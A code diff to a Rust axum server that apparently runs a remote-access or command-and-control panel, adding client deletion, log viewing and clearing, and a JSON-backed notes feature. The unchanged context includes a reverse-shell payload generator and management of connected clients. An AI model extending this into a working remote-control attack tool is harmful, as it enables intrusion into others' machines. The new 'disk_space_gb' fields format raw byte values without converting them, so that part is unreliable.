@@ -11,6 +11,17 @@ use std::net::Ipv4Addr;
 use base64::Engine as _;
 use axum::extract::ws::{WebSocketUpgrade, WebSocket, Message as WsMessage};
 use futures::{sink::SinkExt, stream::StreamExt};
+use serde::{Deserialize, Serialize};
+use std::fs;
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct Note {
+    pub id: String,
+    pub title: String,
+    pub content: String,
+    pub created_at: String,
+    pub updated_at: Option<String>,
+}
 
 pub fn generate_reverse_shell(ip: &str, port: u16) -> Vec<u8> {
     let ip_addr: Ipv4Addr = ip.parse().expect("Invalid IPv4 address");
@@ -127,6 +138,31 @@ pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>>
     Json(clients_vec)
 }
 
+/// Delete a specific client (used by web UI)
+pub async fn delete_client(
+    State(state): State<AppState>,
+    Path(client_id): Path<String>,
+) -> Result<Json<serde_json::Value>, StatusCode> {
+    if state.client_manager.delete_client(&client_id).await {
+        // Log client deletion to audit log
+        state.audit_logger.log_client_disconnect(&client_id);
+        state.audit_logger.log_client_lifecycle(
+            &client_id,
+            "DELETE",
+            "Manual deletion via web interface"
+        );
+        
+        info!("Client {} deleted successfully", client_id);
+        Ok(Json(serde_json::json!({
+            "success": true,
+            "message": "客户端删除成功"
+        })))
+    } else {
+        info!("Client {} not found for deletion", client_id);
+        Err(StatusCode::NOT_FOUND)
+    }
+}
+
 /// Get all clients with display info (used by web UI dashboard)
 pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_json::Value> {
     let clients = state.client_manager.get_clients().await;
@@ -151,6 +187,8 @@ pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_js
                 memory: c.memory,
                 total_disk_space: c.total_disk_space,
                 available_disk_space: c.available_disk_space,
+                total_disk_space_gb: format!("{:.2}", c.total_disk_space as f64),
+                available_disk_space_gb: format!("{:.2}", c.available_disk_space as f64),
                 connected_at: c.connected_at,
                 last_seen: c.last_seen,
                 is_online,
@@ -342,4 +380,163 @@ pub async fn handle_file_operation_response(
     }
 
     Ok(StatusCode::OK)
+}
+
+/// Get server logs
+pub async fn get_logs(State(state): State<AppState>) -> Result<String, StatusCode> {
+    let log_file_path = &state.config.log_file;
+    
+    match std::fs::read_to_string(log_file_path) {
+        Ok(content) => Ok(content),
+        Err(e) => {
+            error!("Failed to read log file {}: {}", log_file_path, e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
+}
+
+/// Clear server logs
+pub async fn clear_logs(State(state): State<AppState>) -> Result<Json<serde_json::Value>, StatusCode> {
+    let log_file_path = &state.config.log_file;
+    
+    match std::fs::write(log_file_path, "") {
+        Ok(()) => {
+            info!("Server logs cleared by web interface");
+            Ok(Json(serde_json::json!({
+                "success": true,
+                "message": "日志已成功清除"
+            })))
+        },
+        Err(e) => {
+            error!("Failed to clear log file {}: {}", log_file_path, e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
+}
+
+const NOTES_FILE: &str = "data/notes.json";
+
+/// 读取备忘录文件
+fn read_notes() -> Result<Vec<Note>, String> {
+    let content = fs::read_to_string(NOTES_FILE)
+        .map_err(|e| format!("Failed to read notes file: {}", e))?;
+    
+    if content.trim().is_empty() {
+        return Ok(Vec::new());
+    }
+    
+    serde_json::from_str(&content)
+        .map_err(|e| format!("Failed to parse notes JSON: {}", e))
+}
+
+/// 写入备忘录文件
+fn write_notes(notes: &[Note]) -> Result<(), String> {
+    let json_content = serde_json::to_string_pretty(notes)
+        .map_err(|e| format!("Failed to serialize notes: {}", e))?;
+    
+    fs::write(NOTES_FILE, json_content)
+        .map_err(|e| format!("Failed to write notes file: {}", e))?;
+    
+    Ok(())
+}
+
+/// 获取所有备忘录
+pub async fn get_notes(State(_state): State<AppState>) -> Result<Json<Vec<Note>>, StatusCode> {
+    match read_notes() {
+        Ok(notes) => Ok(Json(notes)),
+        Err(e) => {
+            error!("Failed to read notes: {}", e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
+}
+
+/// 创建新备忘录
+pub async fn create_note(State(_state): State<AppState>, Json(mut note): Json<Note>) -> Result<Json<Note>, StatusCode> {
+    // 生成唯一ID
+    note.id = uuid::Uuid::new_v4().to_string();
+    note.created_at = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+    note.updated_at = None;
+    
+    match read_notes() {
+        Ok(mut notes) => {
+            notes.insert(0, note.clone()); // 插入到开头，保持最新的在前
+            match write_notes(&notes) {
+                Ok(()) => {
+                    info!("Created new note with ID: {}", note.id);
+                    Ok(Json(note))
+                },
+                Err(e) => {
+                    error!("Failed to save note: {}", e);
+                    Err(StatusCode::INTERNAL_SERVER_ERROR)
+                }
+            }
+        },
+        Err(e) => {
+            error!("Failed to read existing notes: {}", e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
+}
+
+/// 更新备忘录
+pub async fn update_note(State(_state): State<AppState>, Path(note_id): Path<String>, Json(updated_note): Json<Note>) -> Result<Json<Note>, StatusCode> {
+    match read_notes() {
+        Ok(mut notes) => {
+            if let Some(note) = notes.iter_mut().find(|n| n.id == note_id) {
+                note.title = updated_note.title;
+                note.content = updated_note.content;
+                note.updated_at = Some(chrono::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string());
+                
+                let note_clone = note.clone();
+                match write_notes(&notes) {
+                    Ok(()) => {
+                        info!("Updated note with ID: {}", note_id);
+                        Ok(Json(note_clone))
+                    },
+                    Err(e) => {
+                        error!("Failed to save updated note: {}", e);
+                        Err(StatusCode::INTERNAL_SERVER_ERROR)
+                    }
+                }
+            } else {
+                error!("Note not found with ID: {}", note_id);
+                Err(StatusCode::NOT_FOUND)
+            }
+        },
+        Err(e) => {
+            error!("Failed to read notes: {}", e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
+}
+
+/// 删除备忘录
+pub async fn delete_note(State(_state): State<AppState>, Path(note_id): Path<String>) -> Result<StatusCode, StatusCode> {
+    match read_notes() {
+        Ok(mut notes) => {
+            let original_len = notes.len();
+            notes.retain(|n| n.id != note_id);
+            
+            if notes.len() < original_len {
+                match write_notes(&notes) {
+                    Ok(()) => {
+                        info!("Deleted note with ID: {}", note_id);
+                        Ok(StatusCode::OK)
+                    },
+                    Err(e) => {
+                        error!("Failed to save notes after deletion: {}", e);
+                        Err(StatusCode::INTERNAL_SERVER_ERROR)
+                    }
+                }
+            } else {
+                error!("Note not found with ID: {}", note_id);
+                Err(StatusCode::NOT_FOUND)
+            }
+        },
+        Err(e) => {
+            error!("Failed to read notes: {}", e);
+            Err(StatusCode::INTERNAL_SERVER_ERROR)
+        }
+    }
 }
